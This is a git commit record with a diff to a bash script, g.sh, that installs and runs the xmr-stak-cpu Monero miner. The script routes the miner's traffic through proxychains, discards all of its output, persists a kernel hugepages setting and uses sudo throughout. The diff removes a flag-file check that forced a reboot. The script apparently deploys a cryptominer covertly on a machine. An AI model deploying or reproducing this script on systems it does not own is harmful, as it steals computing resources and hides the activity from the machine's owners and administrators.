a4eac57821c1ac135f8af5b732b8b1a2bd1ce227
gwillis9 <gwillis9@csc.com>
2017-06-20 22:53:24 +1000

    Update g.sh

--- g.sh
+++ g.sh
@@ -1,8 +1,6 @@
 #!/bin/bash
 sudo sysctl -w vm.nr_hugepages=128
-file="/flag2"
-if [ -f "$file" ]
-then
+
 	sudo apt-get install cmake -y
 	cd /xmr
 	sudo apt-get install libmicrohttpd-dev libssl-dev cmake build-essential -y
@@ -17,11 +15,6 @@ then
 	sudo cp /xmr/xmr/xmr/config.txt /xmr/xmr/xmr-stak-cpu/bin/config.txt
         cd /xmr/xmr/xmr-stak-cpu/bin/
         sudo /xmr/xmr/proxychains-ng/proxychains4 -f /xmr/xmr/proxychains/proxychains.conf /xmr/xmr/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
-          
-else
+        
         sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
-        sudo /bin/su -c "echo 'xxxxx' >> /flag2"
-        sudo reboot  
-fi
 
-exit
